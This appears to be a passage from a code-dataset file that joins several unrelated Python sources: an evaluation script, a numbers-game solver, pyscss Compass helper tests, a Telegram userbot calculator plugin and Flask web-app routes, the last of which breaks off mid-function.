calc_accuracy(ans1,0,1000)\r\nacc2 = calc_accuracy(ans2,10000,11000)\r\nacc3 = calc_accuracy(ans3,20000,21000)\r\nacc4 = calc_accuracy(ans4,30000,31000)\r\nacc5 = calc_accuracy(ans5,40000,41000)\r\nacc6 = calc_accuracy(ans6,50000,51000)\r\nacc7 = calc_accuracy(ans7,60000,61000)\r\nacc8 = calc_accuracy(ans8,70000,71000)\r\nacc9 = calc_accuracy(ans9,80000,81000)\r\nacc10 = calc_accuracy(ans10,90000,91000)\r\n\r\n\r\nacc1 = (float)(acc1*100/1000)\r\nacc2 = (float)(acc2*100/1000)\r\nacc3 = (float)(acc3*100/1000)\r\nacc4 = (float)(acc4*100/1000)\r\nacc5 = (float)(acc5*100/1000)\r\nacc6 = (float)(acc6*100/1000)\r\nacc7 = (float)(acc7*100/1000)\r\nacc8 = (float)(acc8*100/1000)\r\nacc9 = (float)(acc9*100/1000)\r\nacc10 = (float)(acc10*100/1000)\r\n\r\n\r\n#  finding mean accuracy\r\nacc = acc1+acc2+acc3+acc4+acc5+acc6+acc7+acc8+acc9+acc10\r\nprint (float(acc/10))\r\n\r\n# log1 = calc_meanlog(ans1,1950000,1951000)\r\n# log2 = calc_meanlog(ans2,150000,151000)\r\n# log3 = calc_meanlog(ans3,350000,351000)\r\n# log4 = calc_meanlog(ans4,550000,551000)\r\n# log5 = calc_meanlog(ans5,750000,751000)\r\n# log6 = calc_meanlog(ans6,950000,951000)\r\n# log7 = calc_meanlog(ans7,1150000,1151000)\r\n# log8 = calc_meanlog(ans8,1350000,1351000)\r\n# log9 = calc_meanlog(ans9,1550000,1551000)\r\n# log10 = calc_meanlog(ans10,1750000,1751000)\r\n\r\nlog1 = calc_meanlog(ans1,0,1000)\r\nlog2 = calc_meanlog(ans2,10000,11000)\r\nlog3 = calc_meanlog(ans3,20000,21000)\r\nlog4 = calc_meanlog(ans4,30000,31000)\r\nlog5 = calc_meanlog(ans5,40000,41000)\r\nlog6 = calc_meanlog(ans6,50000,51000)\r\nlog7 = calc_meanlog(ans7,60000,61000)\r\nlog8 = calc_meanlog(ans8,70000,71000)\r\nlog9 = calc_meanlog(ans9,80000,81000)\r\nlog10 = calc_meanlog(ans10,90000,91000)\r\n\r\n# finding mean error\r\nlog = log1 + log2 + log3 + log4 + log5 + log6 + log7 + log8 + log9 + log10\r\nprint (float(log/10))\r\n\r\nx = [1,2,3,4,5,6,7,8,9,10]\r\ny = [acc1, acc2, acc3, acc4, acc5, acc6, acc7, acc8, acc9, acc10]\r\ny2 = [log1, log2, log3, log4, log5, log6, log7, log8, log9, log10]\r\n\r\n# **********************************uncomment the following to get graph plots******************************************\r\n# plotting accuracy\r\n# plt.bar(x,y,align='center')\r\n# plt.ylabel('Accuracy(10 hours)')\r\n# plt.xlabel('10 folds')\r\n# plt.show()\r\n#\r\n# # plotting mean squared log error\r\n# plt.bar(x, y2, align = 'center')\r\n# plt.ylabel('Mean squared log error')\r\n# plt.xlabel('10 folds')\r\n# plt.show()", "413": "from random import *\nfrom itertools import permutations, product\nfrom time import time\n\n\ndef calc(a1, operator, a2):  # A basic function for calculating with\n    global n_calc\n    n_calc += 1\n    if operator == ' + ':\n        return a1 + a2\n    if operator == ' - ':\n        return a1 - a2\n    if operator == ' / ':\n        if a2 == 0:\n            return 10000000\n        else:\n            return a1 / float(a2)\n    if operator == ' * ':\n        return a1 * a2\n\n\ndef counter(string, char):\n    count = 0\n    for c in string:\n        if c == char:\n            count += 1\n    return count\n\n\ndef add_solution(result):\n    result = remove_brackets(result)\n    if len(solutions) < limit and result not in solutions:\n        solutions.append(result)\n        if len(solutions) == limit:\n            print_solutions()\n\n\ndef compare_operators(first, second, pos):\n    if first == '+':\n        if second == '+':\n            return True\n        elif second == '-':\n            if pos:\n                return True\n            else:\n                return False\n        elif second == '*':\n            return False\n        elif second == '/':\n            return False\n    elif first == '-':\n        if second == '+':\n            return True\n        elif second == '-':\n            if pos:\n                return True\n            else:\n                return False\n        elif second == '*':\n            return False\n        elif second == '/':\n            return False\n    elif first == '*':\n        if second == '+':\n            return True\n        elif second == '-':\n            return True\n        elif second == '*':\n            return True\n        elif second == '/':\n            if pos:\n                return True\n            else:\n                return False\n    elif first == '/':\n        if second == '+':\n            return True\n        elif second == '-':\n            return True\n        elif second == '*':\n            return True\n        elif second == '/':\n            if pos:\n                return True\n            else:\n                return False\n\n\ndef remove_brackets(string):\n    no_close_brackets = counter(string, ')')\n    open_brackets = []\n    firsts_to_skip = []\n    brackets_to_remove = []\n    first_op = '+'\n    for i in range(len(string)):\n        if string[i] == '(':\n            open_brackets.append(i)\n        elif string[i] == ')':\n            for x in range(open_brackets[-1], i):\n                if x not in firsts_to_skip and string[x] in ['+', '-', '/', '*']:\n                    first_op = string[x]\n                    firsts_to_skip.append(x)\n                    break\n            if len(firsts_to_skip) == no_close_brackets:\n                for x in range(len(string)):\n                    if x not in firsts_to_skip and string[x] in ['+', '-', '/', '*']:\n                        if x > i:\n                            pos = 1\n                        else:\n                            pos = 0\n                        if compare_operators(first_op, string[x], pos):\n                            brackets_to_remove.append(open_brackets[-1])\n                            brackets_to_remove.append(i)\n\n            if len(open_brackets) == 1 or open_brackets[-1] - 1 == open_brackets[-2]:\n                pos = 1  # AFTER\n                for x in range(i, len(string)):\n                    if string[x] in ['+', '-', '/', '*']:\n                        if compare_operators(first_op, string[x], pos):\n                            brackets_to_remove.append(open_brackets[-1])\n                            brackets_to_remove.append(i)\n                        break\n            else:  # BEFORE\n                pos = 0\n                for x in range(open_brackets[-2], open_brackets[-1]):\n                    if string[x] in ['+', '-', '/', '*'] and x not in firsts_to_skip:\n                        if compare_operators(first_op, string[x], pos):\n                            brackets_to_remove.append(open_brackets[-1])\n                            brackets_to_remove.append(i)\n            open_brackets = open_brackets[:-1]\n    new_string = list('' for i in range(len(string)))\n    for i in range(len(string)):\n        if i not in brackets_to_remove:\n            new_string[i] = string[i]\n    return ''.join(new_string)\n\n\ndef solve():\n    global n_comp\n    if target in number:\n        add_solution(str(target) + ' = ' + str(target))\n        \n    for num_perm in set(permutations(number, 2)):\n        for o1 in op:\n            result = calc(num_perm[0], o1, num_perm[1])\n            n_comp += 1\n            if result == target:\n                solution_str = ''.join(str(num_perm[0]) + o1 + str(num_perm[1]) + ' = ' + str(result))  \n                add_solution(solution_str)\n\n    for num_perm in set(permutations(number, 3)):\n        for op_perm in (p for p in product(op, repeat=2)):\n            result = calc(num_perm[0], op_perm[0], calc(num_perm[1], op_perm[1], num_perm[2]))\n            # a + (b + c)\n            n_comp += 1\n            if result == target:\n                solution_str = str(num_perm[0]) + op_perm[0] + '(' +\\\n                               str(num_perm[1]) + op_perm[1] + str(num_perm[2]) + ')' + ' = ' + str(result)\n                add_solution(solution_str)\n\n            result = calc(calc(num_perm[0], op_perm[0], num_perm[1]), op_perm[1], num_perm[2])\n            # (a + b) + c\n            n_comp += 1\n            if result == target:\n                solution_str = '(' + str(num_perm[0]) + op_perm[0] + \\\n                               str(num_perm[1]) + ')' + op_perm[1] + str(num_perm[2]) + ' = ' + str(result)\n                add_solution(solution_str)\n\n    for num_perm in set(permutations(number, 4)):\n        for op_perm in (p for p in product(op, repeat=3)):\n            \n            result = calc(num_perm[0], op_perm[0], calc(num_perm[1], op_perm[1],\n                                                        calc(num_perm[2], op_perm[2], num_perm[3])))\n            # a + (b + (c + d))\n            n_comp += 1\n            if result == target:\n                solution_str = str(num_perm[0]) + op_perm[0] + '(' + str(num_perm[1]) + op_perm[1] + '(' +\\\n                               str(num_perm[2]) + op_perm[2] + str(num_perm[3]) + ')) = ' + str(result)\n                add_solution(solution_str)\n\n            result = calc(calc(num_perm[0], op_perm[0], num_perm[1]), op_perm[1],\n                          calc(num_perm[2], op_perm[2], num_perm[3]))\n            # (a + b) + (c + d)\n            n_comp += 1\n            if result == target:\n                solution_str = '(' + str(num_perm[0]) + op_perm[0] + str(num_perm[1]) + ')' + op_perm[1] + '(' + \\\n                               str(num_perm[2]) + op_perm[2] + str(num_perm[3]) + ') = ' + str(result)\n                add_solution(solution_str)\n\n            result = calc(num_perm[0], op_perm[0],\n                          calc(calc(num_perm[1], op_perm[1], num_perm[2]), op_perm[2], num_perm[3]))\n            # a + ((b + c) + d)\n            n_comp += 1\n            if result == target:\n                solution_str = str(num_perm[0]) + op_perm[0] + '((' + str(num_perm[1]) + op_perm[1] + \\\n                               str(num_perm[2]) + ')' + op_perm[2] + str(num_perm[3]) + ') = ' + str(result)\n                add_solution(solution_str)\n    for num_perm in set(permutations(number, 5)):\n        for op_perm in (p for p in product(op, repeat=4)):\n            n_comp += 1\n            result = calc(num_perm[0], op_perm[0],\n                          calc(num_perm[1], op_perm[1],\n                               calc(num_perm[2], op_perm[2],\n                                    calc(num_perm[3], op_perm[3], num_perm[4]))))\n            # a + (b + (c + (d + e)))\n            if result == target:\n                solution_str = str(num_perm[0]) + op_perm[0] + '(' + str(num_perm[1]) + op_perm[1] + \\\n                               '(' + str(num_perm[2]) + op_perm[2] + '(' + str(num_perm[3]) + op_perm[3]\\\n                               + str(num_perm[4]) + '))) = ' + str(result)\n                add_solution(solution_str)\n            n_comp += 1\n            result = calc(calc(calc(num_perm[0], op_perm[0], num_perm[1]), op_perm[1],\n                               calc(num_perm[2], op_perm[2], num_perm[3])), op_perm[3], num_perm[4])\n            # ((a + b) + (c + d)) + e\n            if result == target:\n                solution_str = '((' + str(num_perm[0]) + op_perm[0] + str(num_perm[1]) + ')' + op_perm[1] + \\\n                               '(' + str(num_perm[2]) + op_perm[2] + str(num_perm[3]) + '))' + op_perm[3] \\\n                               + str(num_perm[4]) + ' = ' + str(result)\n                add_solution(solution_str)\n            n_comp += 1\n            result = calc(calc(num_perm[0], op_perm[0], num_perm[1]), op_perm[1],\n                          calc(num_perm[2], op_perm[2], calc(num_perm[3], op_perm[3], num_perm[4])))\n            # (a + b) + (c + (d + e))\n            if result == target:\n                solution_str = '(' + str(num_perm[0]) + op_perm[0] + str(num_perm[1]) + ')' + op_perm[1] + \\\n                               '(' + str(num_perm[2]) + op_perm[2] + '(' + str(num_perm[3]) + op_perm[3] \\\n                               + str(num_perm[4]) + ')) = ' + str(result)\n                add_solution(solution_str)\n\n    for num_perm in set(permutations(number, 6)):\n        for op_perm in (p for p in product(op, repeat=5)):\n            n_comp += 1\n            result = calc(num_perm[0], op_perm[0],\n                          calc(num_perm[1], op_perm[1],\n                               calc(num_perm[2], op_perm[2],\n                                    calc(num_perm[3], op_perm[3], calc(num_perm[4], op_perm[4], num_perm[5])))))\n            # a + (b + (c + (d + (e + f))))\n            if result == target:\n                solution_str = str(num_perm[0]) + op_perm[0] + '(' + str(num_perm[1]) + op_perm[1] + \\\n                               '(' + str(num_perm[2]) + op_perm[2] + '(' + str(num_perm[3]) + op_perm[3] \\\n                               + '(' + str(num_perm[4]) + op_perm[4] + str(num_perm[5]) + ')))) = ' + str(result)\n                add_solution(solution_str)\n            n_comp += 1\n            result = calc(calc(calc(num_perm[0], op_perm[0], num_perm[1]), op_perm[1],\n                               calc(num_perm[2], op_perm[2], num_perm[3])), op_perm[3],\n                          calc(num_perm[4], op_perm[4], num_perm[5]))\n            # ((a + b) + (c + d)) + (e + f)\n            if result == target:\n                solution_str = '((' + str(num_perm[0]) + op_perm[0] + str(num_perm[1]) + ')' + op_perm[1] + \\\n                               '(' + str(num_perm[2]) + op_perm[2] + str(num_perm[3]) + '))' + op_perm[3] \\\n                               + '(' + str(num_perm[4]) + op_perm[4] + str(num_perm[5]) + ') = ' + str(result)\n                add_solution(solution_str)\n            n_comp += 1\n            result = calc(calc(num_perm[0], op_perm[0],\n                               calc(calc(num_perm[1], op_perm[1], num_perm[2]), op_perm[2],\n                               calc(num_perm[3], op_perm[3], num_perm[4]))), op_perm[4], num_perm[5])\n            # (a + ((b + c) + (d + e))) + f\n            if result == target:\n                solution_str = '(' + str(num_perm[0]) + op_perm[0] + '((' + str(num_perm[1]) + op_perm[1] +\\\n                               str(num_perm[2]) + ')' + op_perm[2] + '(' + str(num_perm[3]) + op_perm[3] \\\n                               + str(num_perm[4]) + ')))' + op_perm[4] + str(num_perm[5]) + ' = ' + str(result)\n                add_solution(solution_str)\n    print_solutions()\n\n\ndef print_solutions():\n    time_d = time() - now\n    if len(solutions) > 0:  # checks if it found anything\n        for te in solutions:  # prints it\n            print(te)\n    print(\"Done.\")\n    print(str(len(solutions)) + \" results were found.\")  # tells the user how many result were found\n    print('Time = ', time_d)\n    print('Calculations performed', n_calc)\n    print('Comparisons: ', n_comp)\n    exit(0)\n\n\nif __name__ == '__main__':\n    number = [1, 2, 3, 4, 5, 6]\n    print('Numbers:', number)\n\n    # target = randint(40, 100)\n    target = 582\n    print('Target:', target)\n\n    solutions = []\n\n    numbers = []\n    n_calc = 0\n    # string_num = raw_input(\"What are the Numbers? \\nPlease ensure that the numbers are separated by a comma.\\n\")\n    n_comp = 6\n\n    limit = 1\n\n    solution = []\n\n    # number = map(int, string_num.split(','))\n\n    # target = int(raw_input(\"What is the Target?\\n\"))  # Asks the user for the target and converts it to an integer\n\n    op = (' + ', ' - ', ' / ', ' * ')  # represents plus, subtract, divide and times\n\n    now = time()\n\n    solve()  # initiates the program\n\n", "414": "\"\"\"Tests for the Compass helper functions.\n\nNot all of Compass is implemented, and the arrangement of Compass functions\ndoesn't exactly match the arrangement in the original documentation.\nRegardless, this is a good starting place:\n\nhttp://compass-style.org/reference/compass/helpers/\n\nSome functions appear to be undocumented, but nonetheless are part of Compass's\nRuby code.\n\"\"\"\nfrom __future__ import absolute_import\nfrom __future__ import unicode_literals\n\nimport os\n\nfrom scss import config\nfrom scss.calculator import Calculator\nfrom scss.extension.compass import CompassExtension\n\nimport pytest\n\n# TODO many of these tests could also stand to test for failure cases\n\n\n@pytest.fixture\ndef calc():\n    return Calculator(CompassExtension.namespace).evaluate_expression\n\n\n# ------------------------------------------------------------------------------\n# Listish functions\n# See: http://ruby-doc.org/gems/docs/c/compass-0.12.2/Compass/SassExtensions/Functions/Lists.html\n\ndef test_blank(calc):\n    assert calc('blank(false)')\n    assert calc('blank(\"\")')\n    assert calc('blank(\" \")')\n    # TODO this is a syntax error; see #166\n    #assert calc('blank(())')\n\n    assert not calc('blank(null)')  # yes, really\n    assert not calc('blank(1)')\n    assert not calc('blank((1, 2))')\n    assert not calc('blank(0)')\n\n\ndef test_compact(calc):\n    assert calc('compact(1 2 3 false 4 5 null 6 7)') == calc('1 2 3 4 5 6 7')\n\n\ndef test_reject(calc):\n    assert calc('reject(a b c d, a, c)') == calc('b d')\n    assert calc('reject(a b c d, e)') == calc('a b c d')\n\n\ndef test_first_value_of(calc):\n    assert calc('first-value-of(a b c d)') == calc('a')\n    assert calc('first-value-of(\"a b c d\")') == calc('\"a\"')\n\n# -compass-list\n\n# -compass-space-list\n\n# -compass-slice\n\n\n## Property prefixing\n\n# prefixed\n\n# prefix\n\n# -moz...\n\n\n## Selector generation\n\n# append-selector\n\n# elements-of-type\n\ndef test_enumerate(calc):\n    assert calc('enumerate(foo, 4, 7)') == calc('foo-4, foo-5, foo-6, foo-7')\n    assert calc('enumerate(\"bar\", 8, 10)') == calc('bar-8, bar-9, bar-10')\n\n\ndef test_headings(calc):\n    assert calc('headings()') == calc('h1, h2, h3, h4, h5, h6')\n    assert calc('headings(all)') == calc('h1, h2, h3, h4, h5, h6')\n    assert calc('headings(2)') == calc('h1, h2')\n    assert calc('headings(2, 5)') == calc('h2, h3, h4, h5')\n\n\ndef test_nest(calc):\n    # Using .render() here because the structure is complicated and only the\n    # output matters\n    assert calc('nest(selector1, selector2, selector3)').render() == 'selector1 selector2 selector3'\n    assert calc('nest(\"a b\", \"c d\")').render() == 'a b c d'\n    assert calc('nest((a, b), (c, d))').render() == 'a c, a d, b c, b d'\n\n\n# range\n\n\n## Working with CSS constants\n\n# position\n\ndef test_opposite_position(calc):\n    assert calc('opposite-position(left)') == calc('right')\n    assert calc('opposite-position(top)') == calc('bottom')\n    assert calc('opposite-position(center)') == calc('center')\n    assert calc('opposite-position(top left)') == calc('bottom right')\n    assert calc('opposite-position(center right)') == calc('center left')\n\n\n## Math\n\ndef test_pi(calc):\n    assert calc('pi()') == calc('3.141592653589793')\n\n\ndef test_e(calc):\n    assert calc('e()') == calc('2.718281828459045')\n\n\ndef test_sqrt(calc):\n    assert calc('sqrt(9)') == calc('3')\n\n\ndef test_log(calc):\n    assert calc('log(9, 3)') == calc('2')\n\n\ndef test_pow(calc):\n    assert calc('pow(3, 2)') == calc('9')\n    assert calc('pow(10px, 2) / 1px') == calc('100px')\n\n\n# sin\n\n# cos\n\n# tan\n\n\n## Fonts\n# font-url\ndef test_font_url(calc):\n    # nb: config.FONTS_URL is None and defaults to this\n    fonts_url = config.STATIC_URL\n    assert calc('font-url(\"/some_path.woff\")').render() == 'url({0}some_path.woff)'.format(fonts_url)\n    assert calc('font-url(\"/some_path.woff\") format(\"woff\")').render() == 'url({0}some_path.woff) format(\"woff\")'.format(fonts_url)\n\n\n# font-files\ndef test_font_files(calc):\n    \"\"\"\n    @author: funvit\n    @note: adapted from  compass / test / units / sass_extensions_test.rb\n    \"\"\"\n    # nb: config.FONTS_URL is None and defaults to this\n    fonts_url = config.STATIC_URL\n    assert '' == calc('font-files()').render()\n    assert 'url({0}font/name.woff) format(\"woff\"), url({0}fonts/name.ttf) format(\"truetype\"), url({0}fonts/name.svg#fontpath) format(\"svg\")'.format(fonts_url) == calc('font-files(\"/font/name.woff\", woff, \"/fonts/name.ttf\", truetype, \"/fonts/name.svg#fontpath\", svg)').render()\n\n    assert 'url({0}font/with/right_ext.woff) format(\"woff\")'.format(fonts_url) == calc('font_files(\"/font/with/right_ext.woff\")').render()\n    assert 'url({0}font/with/wrong_ext.woff) format(\"svg\")'.format(fonts_url) == calc('font_files(\"/font/with/wrong_ext.woff\", \"svg\")').render()\n    assert 'url({0}font/with/no_ext) format(\"opentype\")'.format(fonts_url) == calc('font_files(\"/font/with/no_ext\", \"otf\")').render()\n    assert 'url({0}font/with/weird.ext) format(\"truetype\")'.format(fonts_url) == calc('font_files(\"/font/with/weird.ext\", \"truetype\")').render()\n\n    assert 'url({0}font/with/right_ext.woff) format(\"woff\"), url({0}font/with/right_ext_also.otf) format(\"opentype\")'.format(fonts_url) == calc('font_files(\"/font/with/right_ext.woff\", \"/font/with/right_ext_also.otf\")').render()\n    assert 'url({0}font/with/wrong_ext.woff) format(\"truetype\"), url({0}font/with/right_ext.otf) format(\"opentype\")'.format(fonts_url) == calc('font_files(\"/font/with/wrong_ext.woff\", \"ttf\", \"/font/with/right_ext.otf\")').render()\n\n\n# inline-font-files\ndef test_inline_font_files(calc, monkeypatch):\n    \"\"\"\n    @author: funvit\n    @note: adapted from  compass / test / units / sass_extensions_test.rb\n    \"\"\"\n    monkeypatch.setattr(config, 'FONTS_ROOT', os.path.join(config.PROJECT_ROOT, 'tests/files/fonts'))\n\n    with open(os.path.join(config.PROJECT_ROOT, 'tests/files/fonts/bgrove.base64.txt'), 'r') as f:\n        font_base64 = ''.join((f.readlines()))\n\n    assert 'url(data:font/truetype;base64,%s) format(\"truetype\")' % font_base64 == calc('inline_font_files(\"/bgrove.ttf\", truetype)').render()\n\n\n## External stylesheets\n\n# stylesheet-url\n", "415": "# Ultroid - UserBot\n# Copyright (C) 2021-2022 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import Button, asst, callback, get_string, in_pattern, udB, ultroid_cmd\n\nCALC = {}\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.del_key(\"calc\")\n    if e.client._bot:\n        return await e.reply(get_string(\"calc_1\"), buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\", owner=True)\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=get_string(\"calc_1\"), buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"), owner=True)\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    user = e.query.user_id\n    get = None\n    if x == \"AC\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.edit(\n            get_string(\"calc_1\"),\n            buttons=[Button.inline(get_string(\"calc_2\"), data=\"recalc\")],\n        )\n    elif x == \"C\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get[:-1]})\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/100\"})\n            await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/\"})\n            await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"*\"})\n            await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = eval(get)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                CALC.pop(user)\n                await e.answer(get_string(\"sf_8\"), cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + x})\n            return await e.answer(str(get + x))\n        CALC.update({user: x})\n        await e.answer(str(x))\n\n\n@callback(\"recalc\", owner=True)\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(get_string(\"calc_1\"), buttons=lst)\n", "416": "from application import application, db, mail\nfrom flask import render_template, request, json, jsonify, Response, redirect, flash, url_for, session, send_file\nfrom flask_mail import Message, Mail\nfrom werkzeug.utils import secure_filename\nfrom application.models import User, Project, CalcInput, CalcType\nfrom application.forms import LoginForm, RegisterForm, ProjectForm, CalcForm, CalcTypeForm, ChangeProjectForm, ChangeCalcForm, ContactForm\nfrom application.mongo_query import getUserProjects, getProjCalcs, removeCalculationFromDB, deleteProject\nfrom application.calcscripts.process.compilecalc import compile_calculation\nimport shutil\nimport os\nimport functools\n\n# decorator function to save navigation history with each new path\ndef store_last_page(func):\n    # python decorator for keeping route method function identity properties\n    @functools.wraps(func)\n    def set_last_page(*args, **kwargs):\n        # set session list with first page always the index\n        if not session.get('global_page_history'):\n            session['global_page_history'] = ['index']\n        else:\n            # get name of route that was navigated to\n            page = func.__name__\n            # don't record if refreshed or same page navigated to\n            if page != session.get('global_page_history')[-1]:\n                session.get('global_page_history').append(page) # save page name\n                # flash(f\"history list: {session.get('global_page_history')}\")\n        # remove first item if list is longer than 10 paths (limit stack size to 10)\n        if  len(session.get('global_page_history')) > 10:\n            session.get('global_page_history').pop(0)\n\n        # call route function and return returned variables\n        return func(*args, **kwargs)\n\n    # return wrapped function\n    return set_last_page\n\n\n\n\n@application.route(\"/\")\n@application.route(\"/index\")\n@application.route(\"/home\")\n@store_last_page\ndef index():\n    return render_template('index.html', index = True)\n\n\n\n@application.route(\"/about\")\n@store_last_page\ndef about():\n    return render_template('about.html', about = True)\n\n\n@application.route(\"/contact\", methods=['GET', 'POST'])\n@store_last_page\ndef contact():\n    form = ContactForm()\n    if form.validate_on_submit():\n        subject = form.subject.data\n        msg = Message(form.subject.data, sender='team@encompapp.com', recipients=['team@encompapp.com'])\n        msg.body = \"\"\"\n        From: %s <%s>\n        %s\n        \"\"\" % (form.name.data, form.email.data, form.message.data)\n        mail.send(msg)\n        flash(\n            \"Thank you for contacting us. We will reach out to you as soon as possible.\",\n            \"success\",\n        )\n\n        return redirect(url_for('index'))\n    # else:\n    #     flash(\"All fields required\")\n    return render_template('contact.html', contact = True, form = form)\n\n\n@application.route(\"/myprojects\", methods=['GET', 'POST'])\n@store_last_page\ndef landing():\n    if not session.get('username'):\n        return redirect(url_for('index'))\n    my_projects = getUserProjects(session.get('user_id'))\n\n    if selected_project_id := request.form.get('selected_project_id'):\n        session['current_project_id'] = selected_project_id\n        selected_project = Project.objects(_id=selected_project_id).first()\n        session['current_p_name'] = selected_project.project_name\n        session['current_p_description'] = selected_project.description\n\n    if session.get('current_project_id'):\n        select_comment = False\n        project_calcs = getProjCalcs(session.get('current_project_id'))\n    else:\n        select_comment = True\n        project_calcs = False\n\n        ###### Import Calculation  #####\n    if request.method == 'POST':\n        if file := request.files.get('upload_calc'):\n            if file.filename == '':\n                flash(\"No file has been selected\")\n            elif session.get('current_project_id'):\n                filename = secure_filename(file.filename)\n                upload_content = file.read()\n                calc_import_dict = json.loads(upload_content)\n                new_calc_from_import = CalcInput(calc_name = calc_import_dict['calc_name'], description = calc_import_dict['description'],calc_type_id= calc_import_dict['calc_type_id'], project_id = session.get('current_project_id'), calc_input_dict=calc_import_dict['calc_input_dict'], left_header=calc_import_dict['left_header'], center_header=calc_import_dict['center_header'],right_header=calc_import_dict['right_header'])\n                new_calc_from_import.save()\n                flash(f\"You have uploaded {filename} successfully as: {calc_import_dict['calc_name']}\", \"success\")\n                return redirect(url_for('landing'))\n\n    if selected_calc_id := request.form.get('selected_calc_id'):\n        session['current_calc_id'] = selected_calc_id\n        selected_calculation = CalcInput.objects(_id=selected_calc_id).first()\n        session['current_c_name'] = selected_calculation.calc_name\n        session['current_c_description'] = selected_calculation.description\n        return redirect(url_for('design_dashboard'))\n\n    ############------------ADD PROJECT FORM-----------##############\n    pform = ProjectForm()\n    if pform.validate_on_submit():\n        project_name = pform.project_name.data\n        description = pform.description.data\n\n        project = Project( project_name=project_name, description=description, user_id=session.get('user_id')) # user_id=ObjectId(),\n        project.save()\n\n        flash(f\"You have saved {project_name}\", \"success\")\n        return redirect(url_for('landing'))\n\n    ############------------CHANGE PROJECT NAME FORM-----------##############\n    pnameform = ChangeProjectForm()\n    if pnameform.validate_on_submit():\n        new_project_name = pnameform.new_project_name.data\n        new_description = pnameform.new_description.data\n\n        project = Project.objects( _id = session['current_project_id'] ).first()\n        project.project_name = new_project_name\n        project.description = new_description\n        project.save()\n\n        flash(f\"You have updated {new_project_name}\", \"success\")\n        return redirect(url_for('landing'))\n\n    ############------------ADD calc FORM-----------##############\n    cform = CalcForm()\n    if cform.validate_on_submit():\n        calc_name = cform.calc_name.data\n        description = cform.description.data\n        calc_type_name = cform.calc_type.data\n        calc_type = CalcType.objects(type_name=calc_type_name).first()\n\n        calc_type_id = calc_type._id\n        project_id = session.get('current_project_id')\n\n        calc = CalcInput( calc_name=calc_name, description=description, calc_type_id=calc_type_id, project_id=project_id) # user_id=ObjectId(),\n        calc.save()\n\n        flash(f\"You have saved {calc_name}\", \"success\")\n        return redirect(url_for('landing'))\n\n    if delete_project_trigger := request.form.get('delete_current_project'):\n        deleteProject(session.get('current_project_id'))\n        deleted_project_name = session.get('current_p_name')\n        session.pop('current_project_id')\n        session.pop('current_p_name')\n        session.pop('current_p_description')\n        if session.get('current_calc_id'):\n            session.pop('current_calc_id')\n            session.pop('current_c_name')\n            session.pop('current_c_description')\n        flash(f\"You have deleted {deleted_project_name}\", \"success\")\n        return redirect(url_for('landing'))\n\n    return render_template('landing.html', my_projects=my_projects, project_calcs=project_calcs, select_comment=select_comment, pform = pform, cform=cform, pnameform = pnameform,current_p_description =session.get('current_p_description'), current_p_name = session.get('current_p_name'),  project=True)\n\n\n@application.route(\"/login\", methods=['GET', 'POST'])\n@store_last_page\ndef login():\n    if session.get('username'):\n        flash(f\"You are already logged in, {session.get('username')}\")\n        return redirect(url_for('landing'))\n    form = LoginForm()\n    formR = RegisterForm()\n\n    if request.method == 'POST':\n        form_submit_dict = request.form\n        login_attempt     = 'login_submit' in form_submit_dict\n        register_attempt  = 'register_submit' in form_submit_dict\n        if login_attempt:\n            if form.validate_on_submit():\n                email       = form.email.data  # request.form.get(\"email\")\n                password    = form.password.data\n\n                user = User.objects(email=email).first()  # gets first occurance not as array, could also do User.objects(email=email)[0]\n                if user and user.get_password(password):\n                    flash(f\"Welcome {user.first_name}, you are successfully logged in!\", \"success\")\n                    session['user_id'] = str(user._id)\n                    session['username'] = user.first_name\n                    session['current_project_id'] = \"\"\n                    return redirect(url_for('landing'))\n                elif user:\n                    flash(\"Password is incorrect.\", \"danger\")\n                